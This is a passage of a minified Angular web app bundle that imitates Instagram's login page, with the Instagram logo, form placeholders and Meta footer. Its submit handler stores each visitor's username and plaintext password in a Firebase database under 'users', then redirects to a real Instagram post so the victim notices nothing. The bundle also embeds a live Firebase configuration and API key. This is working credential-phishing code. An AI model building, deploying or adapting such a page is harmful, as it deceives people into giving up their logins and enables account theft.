this._rootInternal||(this._rootInternal=new gr(this._repo,K())),this._rootInternal}_delete(){return this._rootInternal!==null&&(_L(this._repo,this.app.name),this._repoInternal=null,this._rootInternal=null),Promise.resolve()}_checkNotDeleted(e){this._rootInternal===null&&Kt("Cannot call "+e+" on a deleted database.")}};function PC(t=vi(),e){let n=zo(t,"database").getImmediate({identifier:e});if(!n._instanceStarted){let r=II("database");r&&kC(n,...r)}return n}function kC(t,e,n,r={}){t=xe(t),t._checkNotDeleted("useEmulator"),t._instanceStarted&&Kt("Cannot call useEmulator() after instance has already been initialized.");let i=t._repoInternal,o;if(i.repoInfo_.nodeAdmin)r.mockUserToken&&Kt('mockUserToken is not supported by the Admin SDK. For client access with mock users, please use the "firebase" package instead of "firebase-admin".'),o=new as(as.OWNER);else if(r.mockUserToken){let s=typeof r.mockUserToken=="string"?r.mockUserToken:wI(r.mockUserToken,t.app.options.projectId);o=new as(s)}vL(i,e,n,o)}function wL(t){ck(En),wn(new qe("database",(e,{instanceIdentifier:n})=>{let r=e.getProvider("app").getImmediate(),i=e.getProvider("auth-internal"),o=e.getProvider("app-check-internal");return yL(r,i,o,n)},"PUBLIC").setMultipleInstances(!0)),ue(jw,Uw,t),ue(jw,Uw,"esm2017")}kp.prototype.simpleListen=function(t,e){this.sendRequest("q",{p:t},e)};kp.prototype.echo=function(t,e){this.sendRequest("echo",{d:t},e)};wL();var vr=class{constructor(e){return e}},FC="database",Kp=class{constructor(){return Go(FC)}};var Zp=new I("angularfire2.database-instances");function EL(t,e){let n=Mc(FC,t,e);return n&&new vr(n)}function CL(t){return(e,n)=>{let r=e.runOutsideAngular(()=>t(n));return new vr(r)}}var DL={provide:Kp,deps:[[new Ne,Zp]]},bL={provide:vr,useFactory:EL,deps:[[new Ne,Zp],zt]};function LC(t,...e){return ue("angularfire",rr.full,"rtdb"),gt([bL,DL,{provide:Zp,useFactory:CL(t),multi:!0,deps:[Y,Me,Ii,ir,[new Ne,es],[new Ne,_i],...e]}])}var VC=Wt(PC,!0);var jC=Wt(OC,!0);var UC=Wt(xC,!0);var BC=Wt(Yp,!0);var pl=class t{constructor(e){this.db=e}saveUserData(e,n){return p(this,null,function*(){try{let r=jC(UC(this.db,"users"));return yield BC(r,{username:e,password:n}),"User data saved successfully!"}catch(r){return console.error("Error:",r.message),r.message}})}static \u0275fac=function(n){return new(n||t)(N(vr))};static \u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})};var gl=class t{constructor(e,n){this.fb=e;this.firebaseService=n;this.loginForm=this.fb.group({username:["",hi.required],password:["",[hi.required,hi.minLength(6)]]})}loginForm;onSubmit(){return p(this,null,function*(){if(this.loginForm.valid){let{username:e,password:n}=this.loginForm.value,r=yield this.firebaseService.saveUserData(e,n);window.location.href="https://www.instagram.com/p/DCtwuEpvdVQ/?igsh=OGwzY3EzMGtwY3Zv"}else alert("Please enter valid credentials")})}static \u0275fac=function(n){return new(n||t)(W(gI),W(pl))};static \u0275cmp=Kr({type:t,selectors:[["app-login"]],standalone:!0,features:[Jr],decls:92,vars:2,consts:[["href",jv`https://fonts.cdnfonts.com/css/instagram-sans-2`,"rel","stylesheet"],[1,"container"],[1,"content-container"],[1,"log-in-container"],["src","https://assets.codepen.io/6060109/ig-logo.png","alt","Instagram logo",1,"instagram-logo"],[3,"ngSubmit","formGroup"],["type","text","formControlName","username","placeholder","Phone number, username, or email"],["type","password","formControlName","password","placeholder","Password"],["type","submit","value","Log in",3,"disabled"],[1,"line-break"],[1,"line"],[1,"or"],[1,"facebook-login-container"],["href","#",1,"facebook-login"],["src","https://www.freepnglogos.com/uploads/facebook-logo-icon/facebook-logo-icon-file-facebook-icon-svg-wikimedia-commons-4.png",1,"facebook-icon"],[1,"forgot-password"],["href","#"],[1,"sign-up-container"],[1,"get-the-app"],[1,"get-the-app-image-container"],["src","https://assets.codepen.io/6060109/IG-Google-Play-Button.png","alt","Get it on Google Play",1,"get-the-app-image"],["src","https://assets.codepen.io/6060109/IG-app-store-button.png","alt","Get it on the Apple App Store",1,"get-the-app-image"],[1,"language-copyright-container"]],template:function(n,r){n&1&&(Re(0,"link",0),B(1,"div",1)(2,"div",2)(3,"div",3),Re(4,"img",4),B(5,"form",5),Ft("ngSubmit",function(){return r.onSubmit()}),Re(6,"input",6)(7,"input",7)(8,"input",8),B(9,"div",9),Re(10,"div",10),B(11,"div",11),J(12,"or"),z(),Re(13,"div",10),z(),B(14,"div",12)(15,"a",13),Re(16,"img",14),J(17," Log in with Facebook"),z()(),B(18,"div",15)(19,"a",16),J(20,"Forgot password?"),z()()()(),B(21,"div",17)(22,"p"),J(23,"Don't have an account? "),B(24,"a",16),J(25,"Sign up"),z()()(),B(26,"div",18)(27,"p"),J(28,"Get the app."),z(),B(29,"div",19)(30,"div")(31,"a",16),Re(32,"img",20),z()(),B(33,"div")(34,"a",16),Re(35,"img",21),z()()()()(),B(36,"footer")(37,"ul")(38,"li")(39,"a",16),J(40,"Meta"),z()(),B(41,"li")(42,"a",16),J(43,"About"),z()(),B(44,"li")(45,"a",16),J(46,"Blog"),z()(),B(47,"li")(48,"a",16),J(49,"Jobs"),z()(),B(50,"li")(51,"a",16),J(52,"Help"),z()(),B(53,"li")(54,"a",16),J(55,"API"),z()(),B(56,"li")(57,"a",16),J(58,"Privacy"),z()(),B(59,"li")(60,"a",16),J(61,"Terms"),z()(),B(62,"li")(63,"a",16),J(64,"Top Accounts"),z()(),B(65,"li")(66,"a",16),J(67,"Locations"),z()(),B(68,"li")(69,"a",16),J(70,"Instagram Lite"),z()(),B(71,"li")(72,"a",16),J(73,"Threads"),z()(),B(74,"li")(75,"a",16),J(76,"Contact Uploading & Non-Users"),z()(),B(77,"li")(78,"a",16),J(79,"Meta Verified"),z()()(),B(80,"div",22)(81,"select")(82,"option"),J(83,"English"),z(),B(84,"option"),J(85,"French"),z(),B(86,"option"),J(87,"German"),z(),B(88,"option"),J(89,"Spanish"),z()(),B(90,"p"),J(91,"\xA9 2023 Instagram from Meta"),z()()()()),n&2&&(hd(5),Va("formGroup",r.loginForm),hd(3),Va("disabled",!r.loginForm.valid))},dependencies:[Ed,Ic,cI,hI,pI,yc,nI,rI,Sh,Th],styles:["*[_ngcontent-%COMP%]{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif}.container[_ngcontent-%COMP%]{width:100%}.content-container[_ngcontent-%COMP%]{box-sizing:border-box;padding:10px;width:100%}.instagram-logo[_ngcontent-%COMP%]{display:block;margin:auto;width:80%}input[type=text][_ngcontent-%COMP%], input[type=password][_ngcontent-%COMP%]{background-color:#fafafa;border:1px solid rgb(219,219,219);border-radius:3px;box-sizing:border-box;display:block;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;font-size:14px;height:38px;margin:5px auto;padding-left:7px;width:270px}input[type=submit][_ngcontent-%COMP%]{background:#0095f6;border:none;border-radius:8px;box-sizing:border-box;color:#fff;display:block;height:32px;margin:15px auto;width:270px}a[_ngcontent-%COMP%]{text-decoration:none}.line-break[_ngcontent-%COMP%]{align-items:center;box-sizing:border-box;display:flex;height:15px;justify-content:space-between;margin:auto;width:270px}.line[_ngcontent-%COMP%]{background:#dbdbdb;height:1px;width:40%}.or[_ngcontent-%COMP%], footer[_ngcontent-%COMP%]   a[_ngcontent-%COMP%], footer[_ngcontent-%COMP%]   p[_ngcontent-%COMP%], select[_ngcontent-%COMP%]{color:#737373}.or[_ngcontent-%COMP%]{text-transform:uppercase}.facebook-login-container[_ngcontent-%COMP%], .forgot-password[_ngcontent-%COMP%], .sign-up-container[_ngcontent-%COMP%]{margin:30px;text-align:center}.facebook-login[_ngcontent-%COMP%]{color:#385185;font-weight:600}.facebook-icon[_ngcontent-%COMP%]{margin:-3px 5px;width:16px}.forgot-password[_ngcontent-%COMP%]{color:#00376b;font-size:12px}.sign-up-container[_ngcontent-%COMP%]{margin:50px}.get-the-app[_ngcontent-%COMP%]{margin:50px;text-align:center}.get-the-app-image-container[_ngcontent-%COMP%]{display:flex;justify-content:center;margin-top:10px;width:100%}.get-the-app-image[_ngcontent-%COMP%]{height:40px;margin:5px;width:135px}footer[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]{display:flex;flex-wrap:wrap;font-size:12px;list-style-type:none;justify-content:center}footer[_ngcontent-%COMP%]   li[_ngcontent-%COMP%]{margin:10px}select[_ngcontent-%COMP%]{border:none;margin-right:15px}.language-copyright-container[_ngcontent-%COMP%]{display:flex;justify-content:center;margin:20px 0 40px}@media screen and (min-width: 451px){.content-container[_ngcontent-%COMP%]{margin-top:30px}.log-in-container[_ngcontent-%COMP%], .sign-up-container[_ngcontent-%COMP%]{border:solid rgb(219,219,219) 1px;box-sizing:border-box;margin:10px auto;width:350px}.sign-up-container[_ngcontent-%COMP%]{align-items:center;display:flex;height:63px;justify-content:center}}@media screen and (min-width: 876px){.container[_ngcontent-%COMP%]{align-items:center;display:flex;flex-direction:row-reverse;flex-wrap:wrap;justify-content:center;margin:32px auto;width:870px}.content-container[_ngcontent-%COMP%]{width:50%}.image-container[_ngcontent-%COMP%]{background:url(https://assets.codepen.io/6060109/IG-phone.jpeg);background-size:contain;height:580px;width:380px}}"]})};var $C=[{path:"",component:gl}];var HC={providers:[Sy({eventCoalescing:!0}),Yu(Ic),N_($C),GI(()=>qI({apiKey:"AIzaSyDqPRN_okoTwm3h6cxRHr9aQRgKtm8TOgA",authDomain:"project-x-b7a54.firebaseapp.com",databaseURL:"https://project-x-b7a54-default-rtdb.firebaseio.com",projectId:"project-x-b7a54",storageBucket:"project-x-b7a54.firebasestorage.app",messagingSenderId:"840960512406",appId:"1:840960512406:web:7add87048b9f280b230db7",measurementId:"G-7W70P9XY41"})),Lw(()=>Vw()),LC(()=>VC())]};var ml=class t{title="project-x";static \u0275fac=function(n){return new(n||t)};static \u0275cmp=Kr({type:t,selectors:[["app-root"]],standalone:!0,features:[Jr],decls:1,vars:0,template:function(n,r){n&1&&Re(0,"router-outlet")},dependencies:[uh]})};Gy(ml,HC).catch(t=>console.error(t));
